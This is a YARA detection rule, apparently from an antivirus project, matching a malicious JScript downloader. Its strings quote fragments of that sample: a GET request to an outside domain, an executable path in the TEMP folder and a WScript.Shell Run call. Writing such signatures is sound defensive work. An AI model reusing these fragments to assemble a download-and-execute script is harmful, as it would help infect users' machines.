rule sig_20160329_c1048c99b4126cf53d13e21c1dd5c5f2 {
  meta:
    description = "datamaliciousorder - file 20160329_c1048c99b4126cf53d13e21c1dd5c5f2.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ecc346f1c04193d20817ef9ad993cbc3166a75aa2310d07685e06f96171344bf"

  strings:
    $s1  = "d[oD](\"GET\", \"http://shippedmedicalsupplies.com/n5ids\", false);" fullword ascii
    $s2  = "function Ki() {return xs[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"IN0711Z8vckSRI1.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[E](Ik() * 11); if (d[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var xs = function s() {return WScript[R](\"WScript.Shell\");}(), D = 11;" fullword ascii
    $s5  = "function A(Fy, Om){q = q * 1; return Fy - Om;};" fullword ascii
    $s6  = "function e(){return \"\" + Wa;};" fullword ascii
    $s7  = "function U() {return ((h0 == true) && (h0 == x)) ? 1 : q;};" fullword ascii
    $s8  = "function J(j){xs[\"Run\"](j, q, q);};" fullword ascii
    $s9  = " while (V){" fullword ascii
    $s10 = "var B = new this[\"Date\"]();" fullword ascii
    $s11 = "function Ik(){return 22;};" fullword ascii
    $s12 = "function a(){return R;};" fullword ascii
    $s13 = "function AN()" fullword ascii
    $s14 = "function Br(W) {var GG = (1, 2, 3, 4, 5, W); return GG;};" fullword ascii
    $s15 = "return A(aq, in0);" fullword ascii
    $s16 = "x = true; " fullword ascii
    $s17 = "var x = false;" fullword ascii
    $s18 = "var h0 = false;" fullword ascii
    $s19 = "h0 = true; " fullword ascii
    $s20 = "var B0 = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}